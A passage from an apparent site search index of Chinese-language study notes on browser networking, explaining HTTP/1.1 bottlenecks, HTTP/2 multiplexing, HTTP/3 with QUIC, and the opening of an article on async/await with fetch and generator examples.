协议会采用一个非常慢的速度去发送数据，然后慢慢加快发送数据的速度，直到发送数据的速度达到一个理想状态，我们把这个过程称为<strong>慢启动</strong>。</p>\n<p>你可以把每个 TCP 发送数据的过程看成是一辆车的启动过程，当刚进入公路时，会有从 0 到一个稳定速度的提速过程，TCP 的慢启动就类似于该过程。</p>\n<p>慢启动是 TCP 为了减少网络拥塞的一种策略，我们是没有办法改变的。</p>\n<p>而之所以说慢启动会带来性能问题，是因为页面中常用的一些关键资源文件本来就不大，如 HTML 文件、CSS 文件和 JavaScript 文件，通常这些文件在 TCP 连接建立好之后就要发起请求的，但这个过程是慢启动，所以耗费的时间比正常的时间要多很多，这样就推迟了宝贵的首次渲染页面的时长了。</p>\n<p><strong>第二个原因，同时开启了多条 TCP 连接，那么这些连接会竞争固定的带宽。</strong></p>\n<p>你可以想象一下，系统同时建立了多条 TCP 连接，当带宽充足时，每条连接发送或者接收速度会慢慢向上增加；而一旦带宽不足时，这些 TCP 连接又会减慢发送或者接收的速度。比如一个页面有 200 个文件，使用了 3 个 CDN，那么加载该网页的时候就需要建立 6 * 3，也就是 18 个 TCP 连接来下载资源；在下载过程中，当发现带宽不足的时候，各个 TCP 连接就需要动态减慢接收数据的速度。</p>\n<p>这样就会出现一个问题，因为有的 TCP 连接下载的是一些关键资源，如 CSS 文件、JavaScript 文件等，而有的 TCP 连接下载的是图片、视频等普通的资源文件，但是多条 TCP 连接之间又不能协商让哪些关键资源优先下载，这样就有可能影响那些关键资源的下载速度了。</p>\n<p><strong>第三个原因， HTTP/1.1 队头阻塞的问题。</strong></p>\n<p>通过上一篇文章，我们知道在 HTTP/1.1 中使用持久连接时，虽然能公用一个 TCP 管道，但是在一个管道中同一时刻只能处理一个请求，在当前的请求没有结束之前，其他的请求只能处于阻塞状态。这意味着我们不能随意在一个管道中发送请求和接收内容。</p>\n<p>这是一个很严重的问题，因为阻塞请求的因素有很多，并且都是一些不确定性的因素，假如有的请求被阻塞了 5 秒，那么后续排队的请求都要延迟等待 5 秒，在这个等待的过程中，带宽、CPU 都被白白浪费了。</p>\n<p>在浏览器处理生成页面的过程中，是非常希望能提前接收到数据的，这样就可以对这些数据做预处理操作，比如提前接收到了图片，那么就可以提前进行编解码操作，等到需要使用该图片的时候，就可以直接给出处理后的数据了，这样能让用户感受到整体速度的提升。</p>\n<p>但队头阻塞使得这些数据不能并行请求，所以队头阻塞是很不利于浏览器优化的。</p>\n<h2 id=\"HTTP-2的多路复用\"><a href=\"#HTTP-2的多路复用\" class=\"headerlink\" title=\"HTTP/2的多路复用\"></a>HTTP/2 的多路复用</h2><p>前面我们分析了 HTTP/1.1 所存在的一些主要问题：慢启动和 TCP 连接之间相互竞争带宽是由于 TCP 本身的机制导致的，而队头阻塞是由于 HTTP/1.1 的机制导致的。</p>\n<p><strong>那么该如何去解决这些问题呢？</strong></p>\n<p>虽然 TCP 有问题，但是我们依然没有换掉 TCP 的能力，所以我们就要想办法去规避 TCP 的慢启动和 TCP 连接之间的竞争问题。</p>\n<p>基于此，HTTP/2 的思路就是一个域名只使用一个 TCP 长连接来传输数据，这样整个页面资源的下载过程只需要一次慢启动，同时也避免了多个 TCP 连接竞争带宽所带来的问题。</p>\n<p>另外，就是队头阻塞的问题，等待请求完成后才能去请求下一个资源，这种方式无疑是最慢的，所以 HTTP/2 需要实现资源的并行请求，也就是任何时候都可以将请求发送给服务器，而并不需要等待其他请求的完成，然后服务器也可以随时返回处理好的请求资源给浏览器。</p>\n<p>所以，HTTP/2 的解决方案可以总结为：<strong>一个域名只使用一个 TCP 长连接和消除队头阻塞问题</strong>。可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663d92f30ea9cb14030d3301.png\" alt=\"HTTP/2的多路复用\"></p>\n<p>该图就是 HTTP/2 最核心、最重要且最具颠覆性的<strong>多路复用机制</strong>。从图中你会发现每个请求都有一个对应的 ID，如 stream1 表示 index.html 的请求，stream2 表示 foo.css 的请求。这样在浏览器端，就可以随时将请求发送给服务器了。</p>\n<p>服务器端接收到这些请求后，会根据自己的喜好来决定优先返回哪些内容，比如服务器可能早就缓存好了 index.html 和 bar.js 的响应头信息，那么当接收到请求的时候就可以立即把 index.html 和 bar.js 的响应头信息返回给浏览器，然后再将 index.html 和 bar.js 的响应体数据返回给浏览器。之所以可以随意发送，是因为每份数据都有对应的 ID，浏览器接收到之后，会筛选出相同 ID 的内容，将其拼接为完整的 HTTP 响应数据。</p>\n<p>HTTP/2 使用了多路复用技术，可以将请求分成一帧一帧的数据去传输，这样带来了一个额外的好处，就是当收到一个优先级高的请求时，比如接收到 JavaScript 或者 CSS 关键资源的请求，服务器可以暂停之前的请求来优先处理关键资源的请求。</p>\n<h2 id=\"多路复用的实现\"><a href=\"#多路复用的实现\" class=\"headerlink\" title=\"多路复用的实现\"></a>多路复用的实现</h2><p>现在我们知道为了解决 HTTP/1.1 存在的问题，HTTP/2 采用了多路复用机制，那 HTTP/2 是怎么实现多路复用的呢？你可以先看下面这张图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663d932a0ea9cb14030d8974.png\" alt=\"HTTP/2协议栈\"></p>\n<p>从图中可以看出，HTTP/2 添加了一个二进制分帧层，那我们就结合图来分析下 HTTP/2 的请求和接收过程。</p>\n<ul>\n<li>首先，浏览器准备好请求数据，包括了请求行、请求头等信息，如果是 POST 方法，那么还要有请求体。</li>\n<li>这些数据经过二进制分帧层处理之后，会被转换为一个个带有请求 ID 编号的帧，通过协议栈将这些帧发送给服务器。</li>\n<li>服务器接收到所有帧之后，会将所有相同 ID 的帧合并为一条完整的请求信息。</li>\n<li>然后服务器处理该条请求，并将处理的响应行、响应头和响应体分别发送至二进制分帧层。</li>\n<li>同样，二进制分帧层会将这些响应数据转换为一个个带有请求 ID 编号的帧，经过协议栈发送给浏览器。</li>\n<li>浏览器接收到响应帧之后，会根据 ID 编号将帧的数据提交给对应的请求。<br>从上面的流程可以看出，通过引入二进制分帧层，就实现了 HTTP 的多路复用技术。</li>\n</ul>\n<p>上一篇文章我们介绍过，HTTP 是浏览器和服务器通信的语言，在这里虽然 HTTP/2 引入了二进制分帧层，不过 HTTP/2 的语义和 HTTP/1.1 依然是一样的，也就是说它们通信的语言并没有改变，比如开发者依然可以通过 Accept 请求头告诉服务器希望接收到什么类型的文件，依然可以使用 Cookie 来保持登录状态，依然可以使用 Cache 来缓存本地文件，这些都没有变，发生改变的只是传输方式。这一点对开发者来说尤为重要，这意味着我们不需要为 HTTP/2 去重建生态，并且 HTTP/2 推广起来会也相对更轻松了。</p>\n<h2 id=\"HTTP-2其他特性\"><a href=\"#HTTP-2其他特性\" class=\"headerlink\" title=\"HTTP/2其他特性\"></a>HTTP/2 其他特性</h2><p>通过上面的分析，我们知道了多路复用是 HTTP/2 的最核心功能，它能实现资源的并行传输。多路复用技术是建立在二进制分帧层的基础之上。其实基于二进制分帧层，HTTP/2 还附带实现了很多其他功能，下面我们就来简要了解下。</p>\n<h3 id=\"1-可以设置请求的优先级\"><a href=\"#1-可以设置请求的优先级\" class=\"headerlink\" title=\"1. 可以设置请求的优先级\"></a>1. 可以设置请求的优先级</h3><p>我们知道浏览器中有些数据是非常重要的，但是在发送请求时，重要的请求可能会晚于那些不怎么重要的请求，如果服务器按照请求的顺序来回复数据，那么这个重要的数据就有可能推迟很久才能送达浏览器，这对于用户体验来说是非常不友好的。</p>\n<p>为了解决这个问题，HTTP/2 提供了请求优先级，可以在发送请求时，标上该请求的优先级，这样服务器接收到请求之后，会优先处理优先级高的请求。</p>\n<h3 id=\"2-服务器推送\"><a href=\"#2-服务器推送\" class=\"headerlink\" title=\"2. 服务器推送\"></a>2. 服务器推送</h3><p>除了设置请求的优先级外，HTTP/2 还可以直接将数据提前推送到浏览器。你可以想象这样一个场景，当用户请求一个 HTML 页面之后，服务器知道该 HTML 页面会引用几个重要的 JavaScript 文件和 CSS 文件，那么在接收到 HTML 请求之后，附带将要使用的 CSS 文件和 JavaScript 文件一并发送给浏览器，这样当浏览器解析完 HTML 文件之后，就能直接拿到需要的 CSS 文件和 JavaScript 文件，这对首次打开页面的速度起到了至关重要的作用。</p>\n<h3 id=\"3-头部压缩\"><a href=\"#3-头部压缩\" class=\"headerlink\" title=\"3. 头部压缩\"></a>3. 头部压缩</h3><p>无论是 HTTP/1.1 还是 HTTP/2，它们都有请求头和响应头，这是浏览器和服务器的通信语言。HTTP/2 对请求头和响应头进行了压缩，你可能觉得一个 HTTP 的头文件没有多大，压不压缩可能关系不大，但你这样想一下，在浏览器发送请求的时候，基本上都是发送 HTTP 请求头，很少有请求体的发送，通常情况下页面也有 100 个左右的资源，如果将这 100 个请求头的数据压缩为原来的 20%，那么传输效率肯定能得到大幅提升。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就介绍这里，下面我来总结下本文的主要内容。</p>\n<p>我们首先分析了影响 HTTP/1.1 效率的三个主要因素：TCP 的慢启动、多条 TCP 连接竞争带宽和队头阻塞。</p>\n<p>接下来我们分析了 HTTP/2 是如何采用多路复用机制来解决这些问题的。多路复用是通过在协议栈中添加二进制分帧层来实现的，有了二进制分帧层还能够实现请求的优先级、服务器推送、头部压缩等特性，从而大大提升了文件传输效率。</p>\n<p>HTTP/2 协议规范于 2015 年 5 月正式发布，在那之后，该协议已在互联网和万维网上得到了广泛的实现和部署。从目前的情况来看，国内外一些排名靠前的站点基本都实现了 HTTP/2 的部署。使用 HTTP/2 能带来 20%～60% 的效率提升，至于 20% 还是 60% 要看优化的程度。总之，我们也应该与时俱进，放弃 HTTP/1.1 和其性能优化方法，去 “拥抱” HTTP/2。</p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>虽然 HTTP/2 解决了 HTTP/1.1 中的队头阻塞问题，但是 HTTP/2 依然是基于 TCP 协议的，而 TCP 协议依然存在数据包级别的队头阻塞问题，那么你觉得 TCP 的队头阻塞是如何影响到 HTTP/2 性能的呢？</p>\n<p>TCP 的队头阻塞是因为 TCP 协议要求数据包必须按序到达和处理。即便 HTTP/2 能在一个连接上同时发送多个请求和响应，如果 TCP 层面的一个数据包丢失，TCP 协议会确保数据按照正确的顺序被传递到应用层。TCP 协议中的接收窗口将停止向前移动，直到丢失的数据包被成功重传和接收，从而导致了队头阻塞。</p>\n<p>这意味着即使 HTTP/2 中可以同时发送多个请求，一个丢失的 TCP 数据包仍然会阻塞那个 TCP 连接上的所有 HTTP/2 流。队头阻塞在 TCP 级别上的影响可能在下列情况中加剧 HTTP/2 的性能问题：</p>\n<p>网络质量差：在丢包率较高的网络环境中，TCP 重传会更频繁，这会导致更严重的队头阻塞，进而影响 HTTP/2 的性能。</p>\n<p>长距离通信：跨国或跨洲的长距离通信通常伴有较高的延迟。在 TCP 确认和重传机制下，延迟的增加会导致队头阻塞的持续时间增加。</p>\n<p>大量并发流：虽然 HTTP/2 的多路复用技术允许多条流共享一个 TCP 连接，但如果同一连接上有大量的并发 HTTP/2 流，单个丢失数据包导致的队头阻塞将会影响到更多的流。</p>\n<p>为了减轻或解决基于 TCP 的队头阻塞问题，出现了新的传输层协议，例如 QUIC（快速 UDP 互联网连接）。QUIC 建立在 UDP 之上，提供了类似 TCP 的流量和拥塞控制，同时也解决了 TCP 层面上的队头阻塞，因为 QUIC 中的流是独立的，单个流上的丢包不会影响到其它流的传输。HTTP/3 就是基于 QUIC 协议的，它解决了 HTTP/2 在 TCP 层面可能遇到的队头阻塞问题。</p>\n"},{"title":"HTTP/3：甩掉 TCP、TLS 的包袱，构建高效网络","url":"/browser/http/3.html","content":"<p>前面两篇文章我们分析了 HTTP/1 和 HTTP/2 ，在 HTTP/2 出现之前，开发者需要采取很多变通的方式来解决 HTTP/1 所存在的问题，不过 HTTP/2 在 2018 年就开始得到了大规模的应用， HTTP/1 中存在的一大堆缺陷都得到了解决。</p>\n<p> HTTP/2 的一个核心特性是使用了多路复用技术，因此它可以通过一个 TCP 连接来发送多个 URL 请求。多路复用技术能充分利用带宽，最大限度规避了 TCP 的慢启动所带来的问题，同时还实现了头部压缩、服务器推送等功能，使得页面资源的传输速度得到了大幅提升。在 HTTP/1 .1 时代，为了提升并行下载效率，浏览器为每个域名维护了 6 个 TCP 连接；而采用 HTTP/2 之后，浏览器只需要为每个域名维护 1 个 TCP 持久连接，同时还解决了 HTTP/1 .1 队头阻塞的问题。</p>\n<p>从目前的情况来看， HTTP/2 似乎可以完美取代 HTTP/1 了，不过 HTTP/2 依然存在一些缺陷，于是就有了 HTTP/3。和通常一样，介绍 HTTP/3 之前，我们先来看看 HTTP/2 到底有什么缺陷。</p>\n<h2 id=\"TCP-的队头阻塞\"><a href=\"#TCP-的队头阻塞\" class=\"headerlink\" title=\"TCP 的队头阻塞\"></a>TCP 的队头阻塞</h2><p>虽然 HTTP/2 解决了应用层面的队头阻塞问题，不过和 HTTP/1 .1 一样， HTTP/2 依然是基于 TCP 协议的，而 TCP 最初就是为了单连接而设计的。你可以把 TCP 连接看成是两台计算机之前的一个虚拟管道，计算机的一端将要传输的数据按照顺序放入管道，最终数据会以相同的顺序出现在管道的另外一头。</p>\n<p>接下来我们就来分析下 HTTP/1 .1 协议栈中 TCP 是如何传输数据的。为直观理解，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663dc1240ea9cb14036339c5.png\" alt=\"正常情况下的 TCP 传输数据过程\"></p>\n<p>通过上图你会发现，从一端发送给另外一端的数据会被拆分为一个个按照顺序排列的数据包，这些数据包通过网络传输到了接收端，接收端再按照顺序将这些数据包组合成原始数据，这样就完成了数据传输。</p>\n<p>不过，如果在数据传输的过程中，有一个数据因为网络故障或者其他原因而丢包了，那么整个 TCP 的连接就会处于暂停状态，需要等待丢失的数据包被重新传输过来。你可以把 TCP 连接看成是一个按照顺序传输数据的管道，管道中的任意一个数据丢失了，那之后的数据都需要等待该数据的重新传输。为了直观理解，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663dc10a0ea9cb1403630055.png\" alt=\"TCP 丢包状态\"></p>\n<p>我们就把<strong>在 TCP 传输过程中，由于单个数据包的丢失而造成的阻塞称为 TCP 上的队头阻塞</strong>。</p>\n<p>那队头阻塞是怎么影响 HTTP/2 传输的呢？首先我们来看正常情况下 HTTP/2 是怎么传输多路请求的，为了直观理解，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663dc0e80ea9cb140362b20b.png\" alt=\"HTTP/2 多路复用\"></p>\n<p>通过该图，我们知道在 HTTP/2 中，多个请求是跑在一个 TCP 管道中的，如果其中任意一路数据流中出现了丢包的情况，那么就会阻塞该 TCP 连接中的所有请求。这不同于 HTTP/1.1，使用 HTTP/1.1 时，浏览器为每个域名开启了 6 个 TCP 连接，如果其中的 1 个 TCP 连接发生了队头阻塞，那么其他的 5 个连接依然可以继续传输数据。</p>\n<p>所以随着丢包率的增加， HTTP/2 的传输效率也会越来越差。有测试数据表明，当系统达到了 2% 的丢包率时， HTTP/1.1 的传输效率反而比 HTTP/2 表现得更好。</p>\n<h2 id=\"TCP-建立连接的延时\"><a href=\"#TCP-建立连接的延时\" class=\"headerlink\" title=\"TCP 建立连接的延时\"></a>TCP 建立连接的延时</h2><p>除了 TCP 队头阻塞之外， TCP 的握手过程也是影响传输效率的一个重要因素。</p>\n<p>为了搞清楚 TCP 协议建立连接的延迟问题，我们还是先来回顾下网络延迟的概念，这会有助于你对后面内容的理解。网络延迟又称为 RTT（Round Trip Time）。我们把从浏览器发送一个数据包到服务器，再从服务器返回数据包到浏览器的整个往返时间称为 RTT（如下图）。RTT 是反映网络性能的一个重要指标。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663dc0cf0ea9cb1403627399.png\" alt=\"网络延时\"></p>\n<p>那建立 TCP 连接时，需要花费多少个 RTT 呢？下面我们来计算下。</p>\n<p>我们知道 HTTP/1 和 HTTP/2 都是使用 TCP 协议来传输的，而如果使用 HTTPS 的话，还需要使用 TLS 协议进行安全传输，而使用 TLS 也需要一个握手过程，这样就需要有两个握手延迟过程。</p>\n<ol>\n<li>在建立 TCP 连接的时候，需要和服务器进行三次握手来确认连接成功，也就是说需要在消耗完 1.5 个 RTT 之后才能进行数据传输。</li>\n<li>进行 TLS 连接，TLS 有两个版本 ——TLS1.2 和 TLS1.3，每个版本建立连接所花的时间不同，大致是需要 1～2 个 RTT，关于 HTTPS 我们到后面到安全模块再做详细介绍。<br>总之，在传输数据之前，我们需要花掉 3～4 个 RTT。如果浏览器和服务器的物理距离较近，那么 1 个 RTT 的时间可能在 10 毫秒以内，也就是说总共要消耗掉 30～40 毫秒。这个时间也许用户还可以接受，但如果服务器相隔较远，那么 1 个 RTT 就可能需要 100 毫秒以上了，这种情况下整个握手过程需要 300～400 毫秒，这时用户就能明显地感受到 “慢” 了。</li>\n</ol>\n<h2 id=\"TCP-协议僵化\"><a href=\"#TCP-协议僵化\" class=\"headerlink\" title=\"TCP 协议僵化\"></a>TCP 协议僵化</h2><p>现在我们知道了 TCP 协议存在队头阻塞和建立连接延迟等缺点，那我们是不是可以通过改进 TCP 协议来解决这些问题呢？</p>\n<p>答案是：<strong>非常困难</strong>。之所以这样，主要有两个原因。</p>\n<p>第一个是<strong>中间设备的僵化</strong>。要搞清楚什么是中间设备僵化，我们先要弄明白什么是中间设备。我们知道互联网是由多个网络互联的网状结构，为了能够保障互联网的正常工作，我们需要在互联网的各处搭建各种设备，这些设备就被称为中间设备。</p>\n<p>这些中间设备有很多种类型，并且每种设备都有自己的目的，这些设备包括了路由器、防火墙、NAT、交换机等。它们通常依赖一些很少升级的软件，这些软件使用了大量的 TCP 特性，这些功能被设置之后就很少更新了。</p>\n<p>所以，如果我们在客户端升级了 TCP 协议，但是当新协议的数据包经过这些中间设备时，它们可能不理解包的内容，于是这些数据就会被丢弃掉。这就是中间设备僵化，它是阻碍 TCP 更新的一大障碍。</p>\n<p>除了中间设备僵化外，<strong>操作系统也是导致 TCP 协议僵化的另外一个原因</strong>。因为 TCP 协议都是通过操作系统内核来实现的，应用程序只能使用不能修改。通常操作系统的更新都滞后于软件的更新，因此要想自由地更新内核中的 TCP 协议也是非常困难的。</p>\n<h2 id=\"QUIC协议\"><a href=\"#QUIC协议\" class=\"headerlink\" title=\"QUIC协议\"></a>QUIC 协议</h2><p> HTTP/2 存在一些比较严重的与 TCP 协议相关的缺陷，但由于 TCP 协议僵化，我们几乎不可能通过修改 TCP 协议自身来解决这些问题，那么解决问题的思路是绕过 TCP 协议，发明一个 TCP 和 UDP 之外的新的传输协议。但是这也面临着和修改 TCP 一样的挑战，因为中间设备的僵化，这些设备只认 TCP 和 UDP ，如果采用了新的协议，新协议在这些设备同样不被很好地支持。</p>\n<p>因此，HTTP/3 选择了一个折衷的方法 —— UDP 协议，基于 UDP 实现了类似于  TCP 的多路数据流、传输可靠性等功能，我们把这套功能称为 <strong>QUIC 协议</strong>。关于 HTTP/2 和 HTTP/3 协议栈的比较，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663dc06d0ea9cb1403618d71.png\" alt=\" HTTP/2 和HTTP/3协议栈\"></p>\n<p>通过上图我们可以看出，HTTP/3 中的 QUIC 协议集合了以下几点功能。</p>\n<ul>\n<li><strong>实现了类似 TCP 的流量控制、传输可靠性的功能</strong>。虽然 UDP 不提供可靠性的传输，但 QUIC 在 UDP 的基础之上增加了一层来保证数据可靠性传输。它提供了数据包重传、拥塞控制以及其他一些 TCP 中存在的特性。</li>\n<li><strong>集成了 TLS 加密功能</strong>。目前 QUIC 使用的是 TLS1.3，相较于早期版本 TLS1.3 有更多的优点，其中最重要的一点是减少了握手所花费的 RTT 个数。</li>\n<li><strong>实现了 HTTP/2 中的多路复用功能</strong>。和 TCP 不同，QUIC 实现了在同一物理连接上可以有多个独立的逻辑数据流（如下图）。实现了数据流的单独传输，就解决了 TCP 中队头阻塞的问题。</li>\n</ul>\n<p><img data-src=\"https://pic.imgdb.cn/item/663dc0450ea9cb1403612b5f.png\" alt=\"QUIC协议的多路复用\"></p>\n<ul>\n<li>实现了快速握手功能。由于 QUIC 是基于 UDP 的，所以 QUIC 可以实现使用 0-RTT 或者 1-RTT 来建立连接，这意味着 QUIC 可以用最快的速度来发送和接收数据，这样可以大大提升首次打开页面的速度。</li>\n</ul>\n<h2 id=\"HTTP-3的挑战\"><a href=\"#HTTP-3的挑战\" class=\"headerlink\" title=\"HTTP/3的挑战\"></a>HTTP/3 的挑战</h2><p>通过上面的分析，我们相信在技术层面，HTTP/3 是个完美的协议。不过要将 HTTP/3 应用到实际环境中依然面临着诸多严峻的挑战，这些挑战主要来自于以下三个方面。</p>\n<ol>\n<li>从目前的情况来看，服务器和浏览器端都没有对 HTTP/3 提供比较完整的支持。Chrome 虽然在数年前就开始支持 Google 版本的 QUIC，但是这个版本的 QUIC 和官方的 QUIC 存在着非常大的差异。</li>\n<li>部署 HTTP/3 也存在着非常大的问题。因为系统内核对 UDP 的优化远远没有达到 TCP 的优化程度，这也是阻碍 QUIC 的一个重要原因。</li>\n<li>中间设备僵化的问题。这些设备对 UDP 的优化程度远远低于 TCP ，据统计使用 QUIC 协议时，大约有 3%～7% 的丢包率。</li>\n</ol>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p>\n<p>我们首先分析了 HTTP/2 中所存在的一些问题，主要包括了 TCP 的队头阻塞、建立 TCP 连接的延时、 TCP 协议僵化等问题。</p>\n<p>这些问题都是 TCP 的内部问题，因此要解决这些问题就要优化 TCP 或者 “另起炉灶” 创造新的协议。由于优化 TCP 协议存在着诸多挑战，所以官方选择了创建新的 QUIC 协议。</p>\n<p>HTTP/3 正是基于 QUIC 协议的，你可以把 QUIC 看成是集成了 “TCP + HTTP/2 的多路复用 + TLS 等功能” 的一套协议。这是集众家所长的一个协议，从协议最底层对 Web 的文件传输做了比较彻底的优化，所以等生态相对成熟时，可以用来打造比现在的 HTTP/2 还更加高效的网络。</p>\n<p>虽说这套协议解决了 HTTP/2 中因 TCP 而带来的问题，不过由于是改动了底层协议，所以推广起来还会面临着巨大的挑战。</p>\n<p>关于 HTTP/3 的未来，我有下面两点判断：</p>\n<ol>\n<li>从标准制定到实践再到协议优化还需要走很长一段路；</li>\n<li>因为动了底层协议，所以 HTTP/3 的增长会比较缓慢，这和 HTTP/2 有着本质的区别。</li>\n</ol>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>那你来总结一下，HTTP/3 都做了哪些性能上的改进？它所面临的挑战又是什么？</p>\n<p><strong>优化点</strong>：</p>\n<ol>\n<li>实现了类型 TCP 的流量控制、传输的可靠性；</li>\n<li>集成了 TLS 加密功能；</li>\n<li>实现了 HTTP2 中的多路复用；</li>\n<li>实现了快速握手。</li>\n</ol>\n<p><strong>挑战</strong>：</p>\n<ol>\n<li>QUIC 涉及到了底层的调整推动比较困难；</li>\n<li>服务器和浏览器端没有对 HTTP3 提个比较完整的支持；</li>\n<li>中间设备的僵化。</li>\n</ol>\n"},{"title":"浏览器中的网络","url":"/browser/http/index.html","content":"<p><a href=\"/browser/http/1.html\">01. HTTP/1：HTTP 性能优化</a><br><a href=\"/browser/http/2.html\">02. HTTP/2：如何提升网络速度？</a><br><a href=\"/browser/http/3.html\">03. HTTP/3：甩掉 TCP、TLS 的包袱，构建高效网络</a></p>\n"},{"title":"async/await：使用同步的方式去写异步代码","url":"/browser/pageEventLoop/AsyncAwait.html","content":"<p>在上篇文章中，我们介绍了怎么使用 Promise 来实现回调操作，使用 Promise 能很好地解决回调地狱的问题，但是这种方式充满了 Promise 的 then () 方法，如果处理流程比较复杂的话，那么整段代码将充斥着 then，语义化不明显，代码不能很好地表示执行流程。</p>\n<p>比如下面这样一个实际的使用场景：我先请求极客邦的内容，等返回信息之后，我再请求极客邦的另外一个资源。下面代码展示的是使用 fetch 来实现这样的需求，fetch 被定义在 window 对象中，可以用它来发起对远程资源的请求，该方法返回的是一个 Promise 对象，这和我们上篇文章中讲的 XFetch 很像，只不过 fetch 是浏览器原生支持的，并有没利用 XMLHttpRequest 来封装。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">fetch</span>(<span class=\"string\">'https://www.geekbang.org'</span>)</span><br><span class=\"line\">   .<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> {</span><br><span class=\"line\">       <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">       <span class=\"keyword\">return</span> <span class=\"title function_\">fetch</span>(<span class=\"string\">'https://www.geekbang.org/test'</span>)</span><br><span class=\"line\">   }).<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> {</span><br><span class=\"line\">       <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">   }).<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> {</span><br><span class=\"line\">       <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(error)</span><br><span class=\"line\">   })</span><br></pre></td></tr></tbody></table></figure>\n\n<p>从这段 Promise 代码可以看出来，使用 <code>promise.then</code> 也是相当复杂，虽然整个请求流程已经线性化了，但是代码里面包含了大量的 then 函数，使得代码依然不是太容易阅读。<strong>基于这个原因，ES7 引入了 <code>async/await</code>，这是 JavaScript 异步编程的一个重大改进，提供了在不阻塞主线程的情况下使用同步代码实现异步访问资源的能力，并且使得代码逻辑更加清晰</strong>。你可以参考下面这段代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">  <span class=\"keyword\">try</span>{</span><br><span class=\"line\">    <span class=\"keyword\">let</span> response1 = <span class=\"keyword\">await</span> <span class=\"title function_\">fetch</span>(<span class=\"string\">'https://www.geekbang.org'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'response1'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response1)</span><br><span class=\"line\">    <span class=\"keyword\">let</span> response2 = <span class=\"keyword\">await</span> <span class=\"title function_\">fetch</span>(<span class=\"string\">'https://www.geekbang.org/test'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'response2'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response2)</span><br><span class=\"line\">  }<span class=\"keyword\">catch</span>(err) {</span><br><span class=\"line\">       <span class=\"variable language_\">console</span>.<span class=\"title function_\">error</span>(err)</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">foo</span>()</span><br></pre></td></tr></tbody></table></figure>\n\n<p>通过上面代码，你会发现整个异步处理的逻辑都是使用同步代码的方式来实现的，而且还支持 try catch 来捕获异常，这就是完全在写同步代码，所以是非常符合人的线性思维的。但是很多人都习惯了异步回调的编程思维，对于这种采用同步代码实现异步逻辑的方式，还需要一个转换的过程，因为这中间隐藏了一些容易让人迷惑的细节。</p>\n<p>那么本篇文章我们继续深入，看看 JavaScript 引擎是如何实现 <code>async/await</code> 的。如果上来直接介绍 <code>async/await</code> 的使用方式的话，那么你可能会有点懵，所以我们就从其最底层的技术点一步步往上讲解，从而带你彻底弄清楚 async 和 await 到底是怎么工作的。</p>\n<p>本文我们首先介绍生成器（Generator）是如何工作的，接着讲解 Generator 的底层实现机制 —— 协程（Coroutine）；又因为 <code>async/await</code> 使用了 Generator 和 Promise 两种技术，所以紧接着我们就通过 Generator 和 Promise 来分析 <code>async/await</code> 到底是如何以同步的方式来编写异步代码的。</p>\n<h2 id=\"生成器-VS-协程\"><a href=\"#生成器-VS-协程\" class=\"headerlink\" title=\"生成器 VS 协程\"></a>生成器 VS 协程</h2><p>我们先来看看什么是生成器函数？</p>\n<p>生成器函数是一个带星号函数，而且是可以暂停执行和恢复执行的。我们可以看下面这段代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span>* <span class=\"title function_\">genDemo</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"开始执行第一段\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">yield</span> <span class=\"string\">'generator 1'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"开始执行第二段\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">yield</span> <span class=\"string\">'generator 2'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"开始执行第三段\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">yield</span> <span class=\"string\">'generator 3'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"执行结束\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'generator 4'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span 